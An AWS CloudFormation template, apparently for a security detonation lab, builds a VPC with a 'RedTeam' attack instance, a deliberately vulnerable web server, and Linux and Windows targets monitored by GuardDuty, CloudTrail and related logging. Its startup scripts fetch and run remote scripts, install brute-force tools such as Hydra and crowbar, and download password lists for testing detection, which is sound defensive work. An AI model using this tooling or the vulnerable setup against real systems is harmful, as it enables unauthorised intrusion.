{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "SSHMetricFilter": {
      "Type": "AWS::Logs::MetricFilter",
      "Properties": {
        "LogGroupName": {
          "Ref": "BastionLogGroup"
        },
        "FilterPattern": "ON FROM USER PWD",
        "MetricTransformations": [
          {
            "MetricName": "SSHCommandCount",
            "MetricValue": "1",
            "MetricNamespace": {
              "Fn::Join": [
                "/",
                [
                  "AWSQuickStart",
                  {
                    "Ref": "AWS::StackName"
                  }
                ]
              ]
            }
          }
        ]
      }
    },
    "DHCPOptions": {
      "Type": "AWS::EC2::DHCPOptions",
      "Properties": {
        "DomainName": {
          "Fn::If": [
            "NVirginiaRegionCondition",
            "ec2.internal",
            {
              "Fn::Join": [
                "",
                [
                  {
                    "Ref": "AWS::Region"
                  },
                  ".compute.internal"
                ]
              ]
            }
          ]
        },
        "DomainNameServers": [
          "AmazonProvidedDNS"
        ]
      }
    },
    "VPC": {
      "Type": "AWS::EC2::VPC",
      "Properties": {
        "CidrBlock": {
          "Ref": "VPCCIDR"
        },
        "InstanceTenancy": "default",
        "EnableDnsSupport": true,
        "EnableDnsHostnames": true,
        "Tags": [
          {
            "Key": "Name",
            "Value": {
              "Ref": "AWS::StackName"
            }
          }
        ]
      }
    },
    "VPCDHCPOptionsAssociation": {
      "Type": "AWS::EC2::VPCDHCPOptionsAssociation",
      "Properties": {
        "VpcId": {
          "Ref": "VPC"
        },
        "DhcpOptionsId": {
          "Ref": "DHCPOptions"
        }
      }
    },
    "InternetGateway": {
      "Type": "AWS::EC2::InternetGateway",
      "Properties": {
        "Tags": [
          {
            "Key": "Network",
            "Value": "Public"
          }
        ]
      }
    },
    "VPCGatewayAttachment": {
      "Type": "AWS::EC2::VPCGatewayAttachment",
      "Properties": {
        "VpcId": {
          "Ref": "VPC"
        },
        "InternetGatewayId": {
          "Ref": "InternetGateway"
        }
      }
    },
    "PrivateSubnet": {
      "Type": "AWS::EC2::Subnet",
      "Properties": {
        "VpcId": {
          "Ref": "VPC"
        },
        "CidrBlock": {
          "Ref": "PrivateSubnetCIDR"
        },
        "AvailabilityZone": {
          "Fn::Select": [
            "0",
            {
              "Ref": "AvailabilityZones"
            }
          ]
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "Private subnet"
          },
          {
            "Key": "Network",
            "Value": "Private"
          }
        ]
      }
    },
    "PublicSubnet": {
      "Type": "AWS::EC2::Subnet",
      "Properties": {
        "VpcId": {
          "Ref": "VPC"
        },
        "CidrBlock": {
          "Ref": "PublicSubnetCIDR"
        },
        "AvailabilityZone": {
          "Fn::Select": [
            "0",
            {
              "Ref": "AvailabilityZones"
            }
          ]
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "Public subnet"
          },
          {
            "Key": "Network",
            "Value": "Public"
          }
        ],
        "MapPublicIpOnLaunch": true
      }
    },
    "NATEIP": {
      "DependsOn": "VPCGatewayAttachment",
      "Type": "AWS::EC2::EIP",
      "Properties": {
        "Domain": "vpc",
        "InstanceId": {
          "Fn::If": [
            "NATInstanceCondition",
            {
              "Ref": "NATInstance"
            },
            {
              "Ref": "AWS::NoValue"
            }
          ]
        }
      }
    },
    "NATGateway": {
      "Condition": "NATGatewayCondition",
      "DependsOn": "VPCGatewayAttachment",
      "Type": "AWS::EC2::NatGateway",
      "Properties": {
        "AllocationId": {
          "Fn::GetAtt": [
            "NATEIP",
            "AllocationId"
          ]
        },
        "SubnetId": {
          "Ref": "PublicSubnet"
        }
      }
    },
    "NATInstance": {
      "Condition": "NATInstanceCondition",
      "DependsOn": "VPCGatewayAttachment",
      "Type": "AWS::EC2::Instance",
      "Properties": {
        "ImageId": {
          "Fn::FindInMap": [
            "AWSAMIRegionMap",
            {
              "Ref": "AWS::Region"
            },
            "AWSNATHVM"
          ]
        },
        "InstanceType": "t2.micro",
        "Tags": [
          {
            "Key": "Name",
            "Value": "NAT"
          }
        ],
        "NetworkInterfaces": [
          {
            "GroupSet": [
              {
                "Ref": "NATInstanceSecurityGroup"
              }
            ],
            "AssociatePublicIpAddress": true,
            "DeviceIndex": "0",
            "DeleteOnTermination": true,
            "SubnetId": {
              "Ref": "PublicSubnet"
            }
          }
        ],
        "KeyName": {
          "Fn::If": [
            "NATInstanceCondition",
            {
              "Ref": "KeyPairName"
            },
            {
              "Ref": "AWS::NoValue"
            }
          ]
        },
        "SourceDestCheck": false
      }
    },
    "EIP": {
      "Type": "AWS::EC2::EIP",
      "Properties": {
        "Domain": "vpc"
      }
    },
    "VulnWebServerSecurityGroup": {
      "Type": "AWS::EC2::SecurityGroup",
      "Properties": {
        "GroupDescription": "Enables SSH Access to VulnWebServer Tools Host",
        "VpcId": {
          "Ref": "VPC"
        },
        "SecurityGroupIngress": [
          {
            "IpProtocol": "tcp",
            "FromPort": "22",
            "ToPort": "22",
            "SourceSecurityGroupId": {
              "Ref": "BastionSecurityGroup"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "80",
            "ToPort": "80",
            "SourceSecurityGroupId": {
              "Ref": "BastionSecurityGroup"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "53",
            "ToPort": "53",
            "CidrIp": {
              "Ref": "PrivateSubnetCIDR"
            }
          },
          {
            "IpProtocol": "udp",
            "FromPort": "53",
            "ToPort": "53",
            "CidrIp": {
              "Ref": "PrivateSubnetCIDR"
            }
          },
          {
            "IpProtocol": "tcp",
            "FromPort": "5050",
            "ToPort": "5050",
            "CidrIp": {
              "Ref": "PrivateSubnetCIDR"
            }
          },
          {
            "IpProtocol": "icmp",
            "FromPort": "-1",
            "ToPort": "-1",
            "SourceSecurityGroupId": {
              "Ref": "BastionSecurityGroup"
            }
          }
        ]
      }
    },
    "RedTeamIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Action": [
                "sts:AssumeRole"
              ],
              "Principal": {
                "Service": [
                  "ec2.amazonaws.com"
                ]
              },
              "Effect": "Allow"
            }
          ],
          "Version": "2012-10-17"
        },
        "Path": "/",
        "Policies": []
      }
    },
    "VulnWebServerIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Action": [
                "sts:AssumeRole"
              ],
              "Principal": {
                "Service": [
                  "ec2.amazonaws.com"
                ]
              },
              "Effect": "Allow"
            }
          ],
          "Version": "2012-10-17"
        },
        "Path": "/",
        "Policies": []
      }
    },
    "RedTeam": {
      "Type": "AWS::EC2::Instance",
      "Properties": {
        "KeyName": {
          "Ref": "KeyPairName"
        },
        "NetworkInterfaces": [
          {
            "NetworkInterfaceId": {
              "Ref": "RedTeamNetworkInterface"
            },
            "DeviceIndex": "0"
          }
        ],
        "UserData": {
          "Fn::Base64": {
            "Fn::Join": [
              "",
              [
                "#!/bin/bash\n",
                "export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin\n",
                "echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ec2-user/.profile\n",
                "yum update -y\n",
                "yum install nmap git python python2-pip python-argparse gcc gcc-c++ glib2-devel -y\n",
                "yum install cmake openssl-devel libX11-devel libXi-devel libXtst-devel libXinerama-devel -y\n",
                "yum install perl perl-Net-SSLeay openssl -y \n",
                "pip install paramiko\n",
                "export privateIP=`curl http://169.254.169.254/latest/meta-data/local-ipv4`\n",
                "curl -L https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/guardduty_tester.sh > /home/ec2-user/guardduty_tester.sh\n",
                "mkdir /home/ec2-user/compromised_keys\n",
                "mkdir /home/ec2-user/domains\n",
                "mkdir /home/ec2-user/passwords\n",
                "curl -L https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/queries.txt > /home/ec2-user/domains/queries.txt\n",
                "curl -L https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/password_list.txt > /home/ec2-user/passwords/password_list.txt\n",
                "curl -L https://raw.githubusercontent.com/awslabs/amazon-guardduty-tester/master/artifacts/never_used_sample_key.foo > /home/ec2-user/compromised_keys/compromised.pem\n",
                "FILE=\"/home/ec2-user/compromised_keys/compromised.pem\"\n",
                "for FILE in {1..20}; do cp /home/ec2-user/compromised_keys/compromised.pem /home/ec2-user/compromised_keys/compromised$FILE.pem; done\n",
                "echo 'BASIC_LINUX_TARGET=\"",
                {
                  "Fn::GetAtt": [
                    "BasicLinuxTarget",
                    "PrivateIp"
                  ]
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "echo 'BASIC_WINDOWS_TARGET=\"",
                {
                  "Fn::GetAtt": [
                    "BasicWindowsTarget",
                    "PrivateIp"
                  ]
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "echo -n 'RED_TEAM_INSTANCE=\"' >> /home/ec2-user/localIps.sh\n",
                "wget -q -O - http://169.254.169.254/latest/meta-data/instance-id >> /home/ec2-user/localIps.sh\n",
                "echo '\"' >> /home/ec2-user/localIps.sh\n",
                "echo -n 'RED_TEAM_IP=\"' >> /home/ec2-user/localIps.sh\n",
                "wget -q -O - http://169.254.169.254/latest/meta-data/local-ipv4 >> /home/ec2-user/localIps.sh\n",
                "echo '\"' >> /home/ec2-user/localIps.sh\n",
                "echo 'BASIC_LINUX_INSTANCE=\"",
                {
                  "Ref": "BasicLinuxTarget"
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "echo 'BASIC_WINDOWS_INSTANCE=\"",
                {
                  "Ref": "BasicWindowsTarget"
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "git clone https://github.com/sullo/nikto.git",
                "mkdir /home/ec2-user/FreeRDP\n",
                "mkdir /home/ec2-user/thc-hydra\n",
                "git clone -b \"8.3\" https://github.com/vanhauser-thc/thc-hydra /home/ec2-user/thc-hydra\n",
                "cd /home/ec2-user/thc-hydra\n",
                "/home/ec2-user/thc-hydra/configure\n",
                "make\n",
                "make install\n",
                "git clone git://github.com/FreeRDP/FreeRDP.git /home/ec2-user/FreeRDP\n",
                "cd /home/ec2-user/FreeRDP\n",
                "cmake -DCMAKE_BUILD_TYPE=Debug -DWITH_SSE2=ON .\n",
                "make install\n",
                "echo '/usr/local/lib/freerdp' >> /etc/ld.so.conf.d/freerdp.conf\n",
                "ln -s /usr/local/bin/xfreerdp /usr/bin/xfreerdp\n",
                "cd /home/ec2-user\n",
                "git clone https://github.com/galkan/crowbar /home/ec2-user/crowbar\n",
                "chown -R ec2-user: /home/ec2-user\n",
                "chmod +x /home/ec2-user/guardduty_tester.sh\n",
                "chmod +x /home/ec2-user/crowbar/crowbar.py\n",
                "sleep 300; cd /home/ec2-user/; ./guardduty_tester.sh\n"
              ]
            ]
          }
        },
        "InstanceType": "m4.large",
        "AvailabilityZone": {
          "Fn::Select": [
            "0",
            {
              "Ref": "AvailabilityZones"
            }
          ]
        },
        "ImageId": {
          "Fn::FindInMap": [
            "AWSAMIRegionMap",
            {
              "Ref": "AWS::Region"
            },
            {
              "Fn::FindInMap": [
                "AMINameMap",
                "Amazon-Linux-HVM",
                "Code"
              ]
            }
          ]
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "RedTeam"
          }
        ],
        "IamInstanceProfile": {
          "Ref": "RedTeamInstanceProfile"
        }
      }
    },
    "VulnWebServer": {
      "Type": "AWS::EC2::Instance",
      "Properties": {
        "KeyName": {
          "Ref": "KeyPairName"
        },
        "NetworkInterfaces": [
          {
            "NetworkInterfaceId": {
              "Ref": "VulnWebServerNetworkInterface"
            },
            "DeviceIndex": "0"
          }
        ],
        "UserData": {
          "Fn::Base64": {
            "Fn::Join": [
              "",
              [
                "#!/bin/bash\n",
                "export PATH=$PATH:/usr/local/bin:/usr/sbin:/root/.local/bin\n",
                "echo 'export PATH=/root/.local/bin:/usr/sbin:$PATH' >> /home/ec2-user/.profile\n",
                "yum update -y\n",
                "yum install nmap wget git python python2-pip python-argparse gcc gcc-c++ glib2-devel -y\n",
                "yum install cmake openssl-devel libX11-devel libXi-devel libXtst-devel libXinerama-devel -y\n",
                "",
                "export privateIP=`curl http://169.254.169.254/latest/meta-data/local-ipv4`\n",
                "wget -O /home/ec2-user/setupVunlerableWebServer https://raw.githubusercontent.com/sonofagl1tch/AWSDetonationLab/master/additionalInstallationScripts/setupVunlerableWebServer.sh\n",
                "chmod +x /home/ec2-user/setupVunlerableWebServer\n",
                "bash /home/ec2-user/setupVunlerableWebServer -u false\n",
                "mkdir /home/ec2-user/compromised_keys\n",
                "mkdir /home/ec2-user/domains\n",
                "mkdir /home/ec2-user/passwords\n",
                "echo 'BASIC_LINUX_TARGET=\"",
                {
                  "Fn::GetAtt": [
                    "BasicLinuxTarget",
                    "PrivateIp"
                  ]
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "echo 'BASIC_WINDOWS_TARGET=\"",
                {
                  "Fn::GetAtt": [
                    "BasicWindowsTarget",
                    "PrivateIp"
                  ]
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "echo -n 'RED_TEAM_INSTANCE=\"' >> /home/ec2-user/localIps.sh\n",
                "wget -q -O - http://169.254.169.254/latest/meta-data/instance-id >> /home/ec2-user/localIps.sh\n",
                "echo '\"' >> /home/ec2-user/localIps.sh\n",
                "echo -n 'RED_TEAM_IP=\"' >> /home/ec2-user/localIps.sh\n",
                "wget -q -O - http://169.254.169.254/latest/meta-data/local-ipv4 >> /home/ec2-user/localIps.sh\n",
                "echo '\"' >> /home/ec2-user/localIps.sh\n",
                "echo 'BASIC_LINUX_INSTANCE=\"",
                {
                  "Ref": "BasicLinuxTarget"
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "echo 'BASIC_WINDOWS_INSTANCE=\"",
                {
                  "Ref": "BasicWindowsTarget"
                },
                "\"' >> /home/ec2-user/localIps.sh\n",
                "chown -R ec2-user: /home/ec2-user\n"
              ]
            ]
          }
        },
        "InstanceType": "m4.large",
        "AvailabilityZone": {
          "Fn::Select": [
            "0",
            {
              "Ref": "AvailabilityZones"
            }
          ]
        },
        "ImageId": {
          "Fn::FindInMap": [
            "AWSAMIRegionMap",
            {
              "Ref": "AWS::Region"
            },
            {
              "Fn::FindInMap": [
                "AMINameMap",
                "Amazon-Linux-HVM",
                "Code"
              ]
            }
          ]
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "VulnWebServer"
          }
        ],
        "IamInstanceProfile": {
          "Ref": "VulnWebServerInstanceProfile"
        }
      }
    },
    "BasicLinuxTarget": {
      "Type": "AWS::EC2::Instance",
      "Properties": {
        "KeyName": {
          "Ref": "KeyPairName"
        },
        "NetworkInterfaces": [
          {
            "NetworkInterfaceId": {
              "Ref": "BasicLinuxNetworkInterface"
            },
            "DeviceIndex": "0"
          }
        ],
        "UserData": {
          "Fn::Base64": {
            "Fn::Join": [
              "",
              [
                "#!/bin/bash\n",
                "export PATH=$PATH:/usr/local/bin\n",
                "yum update -y\n",
                "yum install -y httpd24 php70 mysql56-server php70-mysqlnd gcc openssl-devel* nmap\n",
                "service httpd start\n",
                "export LOCAL_HOST=`curl http://169.254.169.254/latest/meta-data/local-hostname`\n",
                "wget -O /home/ec2-user/install https://d1wk0tztpsntt1.cloudfront.net/linux/latest/install\n",
                "chmod +x /home/ec2-user/install\n",
                "bash /home/ec2-user/install -u false\n"
              ]
            ]
          }
        },
        "InstanceType": "m4.large",
        "AvailabilityZone": {
          "Fn::Select": [
            "0",
            {
              "Ref": "AvailabilityZones"
            }
          ]
        },
        "ImageId": {
          "Fn::FindInMap": [
            "AWSAMIRegionMap",
            {
              "Ref": "AWS::Region"
            },
            {
              "Fn::FindInMap": [
                "AMINameMap",
                "Amazon-Linux-HVM",
                "Code"
              ]
            }
          ]
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "BasicLinuxTarget"
          }
        ],
        "IamInstanceProfile": {
          "Ref": "BasicLinuxInstanceProfile"
        }
      }
    },
    "BasicWindowsTarget": {
      "Type": "AWS::EC2::Instance",
      "Properties": {
        "KeyName": {
          "Ref": "KeyPairName"
        },
        "NetworkInterfaces": [
          {
            "GroupSet": [
              {
                "Ref": "BasicWindowsSecurityGroup"
              }
            ],
            "AssociatePublicIpAddress": false,
            "DeviceIndex": "0",
            "DeleteOnTermination": true,
            "SubnetId": {
              "Ref": "PrivateSubnet"
            }
          }
        ],
        "InstanceType": "m4.large",
        "AvailabilityZone": {
          "Fn::Select": [
            "0",
            {
              "Ref": "AvailabilityZones"
            }
          ]
        },
        "ImageId": {
          "Fn::FindInMap": [
            "AWSAMIRegionMap",
            {
              "Ref": "AWS::Region"
            },
            {
              "Fn::FindInMap": [
                "AMINameMap",
                "Windows-Server-2012",
                "Code"
              ]
            }
          ]
        },
        "Tags": [
          {
            "Key": "Name",
            "Value": "BasicWindowsTarget"
          }
        ]
      }
    },
    "CloudWatchLogGroupFlowLogs": {
      "Type": "AWS::Logs::LogGroup",
      "Properties": {
        "RetentionInDays": {
          "Fn::FindInMap": [
            "Defaults",
            "LogGroup",
            "RetentionInDays"
          ]
        }
      }
    },
    "VPCFlowLogStream": {
      "Type": "AWS::Kinesis::Stream",
      "Properties": {
        "ShardCount": {
          "Fn::FindInMap": [
            "Defaults",
            "Stream",
            "ShardCount"
          ]
        }
      }
    },
    "S3BucketGuardDuty": {
      "DeletionPolicy": "Retain",
      "Type": "AWS::S3::Bucket",
      "Properties": {}
    },
    "S3BucketIAM": {
      "DeletionPolicy": "Retain",
      "Type": "AWS::S3::Bucket",
      "Properties": {}
    },
    "S3BucketMacie": {
      "DeletionPolicy": "Retain",
      "Type": "AWS::S3::Bucket",
      "Properties": {}
    },
    "S3BucketInspector": {
      "DeletionPolicy": "Retain",
      "Type": "AWS::S3::Bucket",
      "Properties": {}
    },
    "S3BucketCloudTrail": {
      "DeletionPolicy": "Retain",
      "Type": "AWS::S3::Bucket",
      "Properties": {}
    },
    "S3BucketPolicyGuardDuty": {
      "Type": "AWS::S3::BucketPolicy",
      "Properties": {
        "Bucket": {
          "Ref": "S3BucketGuardDuty"
        },
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Sid": "AWSGuardDutyAclCheck",
              "Effect": "Allow",
              "Principal": {
                "Service": "guardduty.amazonaws.com"
              },
              "Action": "s3:GetBucketAcl",
              "Resource": {
                "Fn::Join": [
                  "",
                  [
                    "arn:aws:s3:::",
                    {
                      "Ref": "S3BucketGuardDuty"
                    }
                  ]
                ]
              }
            },
            {
              "Sid": "AWSGuardDutyWrite",
              "Effect": "Allow",
              "Principal": {
                "Service": "guardduty.amazonaws.com"
              },
              "Action": "s3:PutObject",
              "Resource": {
                "Fn::Join": [
                  "",
                  [
                    "arn:aws:s3:::",
                    {
                      "Ref": "S3BucketGuardDuty"
                    },
                    "/AWSLogs/",
                    {
                      "Ref": "AWS::AccountId"
                    },
                    "/*"
                  ]
                ]
              },
              "Condition": {
                "StringEquals": {
                  "s3:x-amz-acl": "bucket-owner-full-control"
                }
              }
            }
          ]
        }
      }
    },
    "S3BucketPolicyMacie": {
      "Type": "AWS::S3::BucketPolicy",
      "Properties": {
        "Bucket": {
          "Ref": "S3BucketMacie"
        },
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Sid": "AWSMacieAclCheck",
              "Effect": "Allow",
              "Principal": {
                "Service": "macie.amazonaws.com"
              },
              "Action": "s3:GetBucketAcl",
              "Resource": {
                "Fn::Join": [
                  "",
                  [
                    "arn:aws:s3:::",
                    {
                      "Ref": "S3BucketMacie"
                    }
                  ]
                ]
              }
            },
            {
              "Sid": "AWSmacieWrite",
              "Effect": "Allow",
              "Principal": {
                "Service": "macie.amazonaws.com"
              },
              "Action": "s3:PutObject",
              "Resource": {
                "Fn::Join": [
                  "",
                  [
                    "arn:aws:s3:::",
                    {
                      "Ref": "S3BucketMacie"
                    },
                    "/AWSLogs/",
                    {
                      "Ref": "AWS::AccountId"
                    },
                    "/*"
                  ]
                ]
              },
              "Condition": {
                "StringEquals": {
                  "s3:x-amz-acl": "bucket-owner-full-control"
                }
              }
            }
          ]
        }
      }
    },
    "S3BucketVPCflow": {
      "DeletionPolicy": "Retain",
      "Type": "AWS::S3::Bucket",
      "Properties": {
        "LifecycleConfiguration": {
          "Rules": [
            {
              "Status": "Enabled",
              "ExpirationInDays": 7
            }
          ]
        }
      }
    },
    "CloudWatchLogRoleWrite": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": {
                  "Fn::Join": [
                    "",
                    [
                      "logs.",
                      {
                        "Ref": "AWS::Region"
                      },
                      ".amazonaws.com"
                    ]
                  ]
                }
              },
              "Action": "sts:AssumeRole"
            }
          ]
        }
      }
    },
    "CloudWatchLogPolicyWrite": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "CloudWatchLogRoleWrite",
        "Roles": [
          {
            "Ref": "CloudWatchLogRoleWrite"
          }
        ],
        "PolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "logs:CreateLogGroup",
                "logs:CreateLogStream",
                "logs:PutLogEvents",
                "logs:DescribeLogStreams"
              ],
              "Resource": [
                "arn:aws:logs:*:*:*"
              ]
            }
          ]
        }
      }
    },
    "CloudWatchLogGroupLinux": {
      "Type": "AWS::Logs::LogGroup",
      "Properties": {
        "RetentionInDays": 7
      }
    },
    "CloudWatchLogGroupWindows": {
      "Type": "AWS::Logs::LogGroup",
      "Properties": {
        "RetentionInDays": 7
      }
    },
    "CloudWatchLogGroupCloudTrail": {
      "Type": "AWS::Logs::LogGroup",
      "Properties": {
        "RetentionInDays": 7
      }
    },
    "CloudTrailCreateTrail": {
      "Type": "AWS::CloudTrail::Trail",
      "DependsOn" : ["S3BucketCloudTrail","S3BucketPolicyCloudTrail", "FlowLogsToCloudWatchIAMRole", "CloudWatchLogGroupCloudTrail" ],
      "Properties": {
        "CloudWatchLogsLogGroupArn" : {
          "Fn::GetAtt": [
            "CloudWatchLogGroupCloudTrail",
            "Arn"
          ]
        },
        "CloudWatchLogsRoleArn" : {  
          "Fn::GetAtt": [
          "FlowLogsToCloudWatchIAMRole",
          "Arn"
        ]
      },
        "S3BucketName": {
          "Ref": "S3BucketCloudTrail"
        },
        "IsLogging": true,
        "IncludeGlobalServiceEvents" : true,
        "IsMultiRegionTrail" : true
      }
    },
    "FirehoseDeliveryPolicyGuardDuty": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "FirehoseDeliveryPolicyGuardDuty",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
              ],
              "Resource": 
                    [
                      "arn:aws:s3:::S3BucketGuardDuty",
                      "arn:aws:s3:::S3BucketGuardDuty/*"
                    ]
            }
          ]
        },
        "Roles": [
          {
            "Ref": "FirehoseDeliveryRoleALL"
          }
        ]
      }
    },
    "FirehoseDeliveryPolicyCloudTrail": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "FirehoseDeliveryPolicyCloudTrail",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
              ],
              "Resource": 
                    [
                      "arn:aws:s3:::S3BucketCloudTrail",
                      "arn:aws:s3:::S3BucketCloudTrail/*"
                    ]
            },
            {
              "Effect": "Allow",
              "Action": ["log:PutLogEvents"],
              "Resource": "*"
            },
            {
            "Effect": "Allow",
            "Action": [
              "es:DescribeElasticsearchDomain",
              "es:DescribeElasticsearchDomains",
              "es:DescribeElasticsearchDomainConfig",
              "es:ESHttpPost",
              "es:ESHttpPut"
            ],
            "Resource": [
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/*",{ "Domain": {"Ref" : "ESDomainName" }} ]}
             ]
            },
            {
              "Effect": "Allow",
              "Action": [
                "lambda:InvokeFunction",
                "lambda:GetFunctionConfiguration"
              ],
            "Resource": [
                {"Fn::Sub" : "arn:aws:lambda:${AWS::Region}:${AWS::AccountId}:function:%FIREHOSE_DEFAULT_FUNCTION%:%FIREHOSE_DEFAULT_VERSION%"}
                  ]
            },
            {
            "Effect": "Allow",
            "Action": [
              "es:ESHttpGet"
            ],
            "Resource": [
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/_all/_settings",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/_cluster/stats",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/_nodes",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/_nodes/stats",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/_nodes/*/stats",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/_stats",{ "Domain": {"Ref" : "ESDomainName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/${ESIndex}*/_stats",{ "Domain": {"Ref" : "ESDomainName" },"ESIndex": {"Ref" : "IndexName" }} ]},
              {"Fn::Sub" : ["arn:aws:es:${AWS::Region}:${AWS::AccountId}:domain/${Domain}/${ESIndex}*/_mapping/log",{ "Domain": {"Ref" : "ESDomainName" },"ESIndex": {"Ref" : "IndexName" }} ]}
                  ]
            }
        ]
      },
        "Roles": [
          {
            "Ref": "FirehoseDeliveryRoleALL"
          }
        ]
      }
    },
    "FirehoseDeliveryPolicyIAM": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "FirehoseDeliveryPolicyIAM",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
              ],
              "Resource": [
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketIAM"
                      }
                    ]
                  ]
                },
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketIAM"
                      },
                      "*"
                    ]
                  ]
                }
              ]
            }
          ]
        },
        "Roles": [
          {
            "Ref": "FirehoseDeliveryRoleALL"
          }
        ]
      }
    },
    "FirehoseDeliveryPolicyInspector": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "FirehoseDeliveryPolicyInspector",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
              ],
              "Resource": [
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketInspector"
                      }
                    ]
                  ]
                },
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketInspector"
                      },
                      "*"
                    ]
                  ]
                }
              ]
            }
          ]
        },
        "Roles": [
          {
            "Ref": "FirehoseDeliveryRoleALL"
          }
        ]
      }
    },
    "FirehoseDeliveryPolicyMacie": {
      "Type": "AWS::IAM::Policy",
      "Properties": {
        "PolicyName": "FirehoseDeliveryPolicyMacie",
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Effect": "Allow",
              "Action": [
                "s3:AbortMultipartUpload",
                "s3:GetBucketLocation",
                "s3:GetObject",
                "s3:ListBucket",
                "s3:ListBucketMultipartUploads",
                "s3:PutObject"
              ],
              "Resource": [
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketMacie"
                      }
                    ]
                  ]
                },
                {
                  "Fn::Join": [
                    "",
                    [
                      "arn:aws:s3:::",
                      {
                        "Ref": "S3BucketMacie"
                      },
                      "*"
                    ]
                  ]
                }
              ]
            }
          ]
        },
        "Roles": [
          {
            "Ref": "FirehoseDeliveryRoleALL"
          }
        ]
      }
    },
    "FirehoseDeliveryRoleALL": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Sid": "",
              "Effect": "Allow",
              "Principal": {
                "Service": ["firehose.amazonaws.com", "es.amazonaws.com"]
              },
              "Action": "sts:AssumeRole",
              "Condition": {
                "StringEquals": {
                  "sts:ExternalId": {
                    "Ref": "AWS::AccountId"
                  }
                }
              }
            }
          ]
        },
        "Policies": [ {
          "PolicyName": "AllowElasticSearch",
          "PolicyDocument": { 
            "Version" : "2012-10-17",
            "Statement": [ {  
              "Effect": "Allow",
